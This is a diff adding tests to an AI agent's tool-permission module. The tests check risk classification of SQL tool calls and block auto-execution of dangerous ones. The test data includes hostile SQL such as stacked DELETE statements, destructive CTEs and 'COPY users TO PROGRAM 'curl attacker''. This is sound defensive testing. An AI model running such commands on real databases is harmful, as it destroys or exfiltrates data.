@@ -70,6 +70,7 @@ const {
   getToolRiskLevelForCall,
   isUnityApplyTextPrecisePatchArgs,
   isToolAutoExecutableForCall,
+  normalizeToolPermissionPolicy,
   routeMcpToolsForPrompt,
 } = await loadToolCapabilitiesModule();
 
@@ -154,6 +155,17 @@ test("desktop control is exposed for execution but remains separately approval g
   assert.equal(registry.tools.computer_use.category, "desktop");
   assert.equal(isToolAutoExecutableForCall("computer_use", { app_name: "MAIN" }, registry), false);
   assert.ok(createDefaultToolPermissionPolicy().approvalRequiredRiskLevels.includes("desktop_control"));
+  const unsafePersistedPolicy = normalizeToolPermissionPolicy({
+    autoExecuteRiskLevels: ["read_only", "desktop_control", "destructive"],
+  });
+  assert.deepEqual(unsafePersistedPolicy.autoExecuteRiskLevels, ["read_only"]);
+  assert.equal(
+    isToolAutoExecutableForCall("computer_use", { app_name: "MAIN" }, registry, {
+      ...unsafePersistedPolicy,
+      autoExecuteRiskLevels: ["desktop_control"],
+    }),
+    false,
+  );
   assert.deepEqual(
     filterToolDefinitionsForIntent(tools, "plan", registry).map((item) => item.function.name),
     ["read_file"],
@@ -338,6 +350,138 @@ test("SQL call risk is refined from arguments", () => {
   assert.equal(getToolRiskLevelForCall("postgres_query", { sql: "select * from users" }, registry), "external_read");
   assert.equal(getToolRiskLevelForCall("postgres_query", { sql: "update users set admin = true" }, registry), "external_write");
   assert.equal(getToolRiskLevelForCall("postgres_query", { sql: "drop table users" }, registry), "destructive");
+  assert.equal(
+    getToolRiskLevelForCall("postgres_query", { sql: "SELECT 1; DELETE FROM users" }, registry),
+    "destructive",
+  );
+  assert.equal(
+    getToolRiskLevelForCall(
+      "postgres_query",
+      { sql: "WITH removed AS (DELETE FROM users RETURNING id) SELECT * FROM removed" },
+      registry,
+    ),
+    "destructive",
+  );
+  assert.equal(
+    getToolRiskLevelForCall(
+      "postgres_query",
+      { sql: "WITH active AS (SELECT id FROM users WHERE active = true) SELECT * FROM active" },
+      registry,
+    ),
+    "external_read",
+  );
+  assert.equal(
+    getToolRiskLevelForCall(
+      "postgres_query",
+      { sql: "SELECT 'DELETE FROM users' AS example -- DELETE is documentation\n" },
+      registry,
+    ),
+    "external_read",
+  );
+  assert.equal(
+    isToolAutoExecutableForCall(
+      "postgres_query",
+      { sql: "SELECT 1; DELETE FROM users" },
+      registry,
+    ),
+    false,
+  );
+
+  const readDeclaredRegistry = {
+    ...registry,
+    tools: {
+      ...registry.tools,
+      postgres_query: {
+        ...registry.tools.postgres_query,
+        risk: "external_read",
+        autoExecutable: true,
+      },
+    },
+  };
+  for (const sql of [
+    "COPY users TO PROGRAM 'curl attacker'",
+    "DO $$ BEGIN DELETE FROM users; END $$",
+    "PRAGMA journal_mode(WAL)",
+    "PRAGMA cache_size(-8000)",
+    "BEGIN",
+    "SET ROLE admin",
+    "LOCK TABLE users IN ACCESS EXCLUSIVE MODE",
+    "SELECT 1; /*!50000 DELETE FROM users */",
+    "SELECT /*+ vendor_directive */ 1",
+  ]) {
+    assert.notEqual(
+      getToolRiskLevelForCall("postgres_query", { sql }, readDeclaredRegistry),
+      "external_read",
+      sql,
+    );
+    assert.equal(
+      isToolAutoExecutableForCall("postgres_query", { sql }, readDeclaredRegistry),
+      false,
+      sql,
+    );
+  }
+});
+
+test("generic MCP query tools refine risk from SQL-shaped arguments", () => {
+  const registry = buildToolCapabilityRegistry({
+    toolDefinitions: [tool("execute_query", "Execute a query against the configured datasource")],
+    mcpTools: [{
+      name: "execute_query",
+      description: "Execute a query against the configured datasource",
+      inputSchema: {},
+    }],
+    mcpToolServerMap: { execute_query: "http://mcp.test" },
+    policy: createDefaultToolPermissionPolicy(),
+  });
+  const readDeclaredRegistry = {
+    ...registry,
+    tools: {
+      ...registry.tools,
+      execute_query: {
+        ...registry.tools.execute_query,
+        category: "mcp",
+        risk: "external_read",
+        autoExecutable: true,
+      },
+    },
+  };
+
+  assert.equal(
+    getToolRiskLevelForCall("execute_query", { sql: "SELECT * FROM users" }, readDeclaredRegistry),
+    "external_read",
+  );
+  assert.equal(
+    getToolRiskLevelForCall("execute_query", { statement: "DELETE FROM users" }, readDeclaredRegistry),
+    "destructive",
+  );
+  assert.equal(
+    getToolRiskLevelForCall("execute_query", { sql: "COPY users TO PROGRAM 'curl attacker'" }, readDeclaredRegistry),
+    "external_write",
+  );
+  assert.equal(
+    getToolRiskLevelForCall("execute_query", { sql: "ANALYZE users" }, readDeclaredRegistry),
+    "external_write",
+  );
+  assert.equal(
+    isToolAutoExecutableForCall(
+      "execute_query",
+      { sql: "ANALYZE users" },
+      readDeclaredRegistry,
+    ),
+    false,
+  );
+  assert.equal(
+    getToolRiskLevelForCall("execute_query", { query: "SELECT id FROM users" }, readDeclaredRegistry),
+    "external_read",
+  );
+  assert.equal(
+    getToolRiskLevelForCall("execute_query", { input: "DELETE FROM users" }, readDeclaredRegistry),
+    "destructive",
+  );
+  assert.equal(
+    getToolRiskLevelForCall("execute_query", { query: "active users" }, readDeclaredRegistry),
+    "external_read",
+  );
 });
 
 test("dangerous shell command calls are elevated to destructive risk", () => {
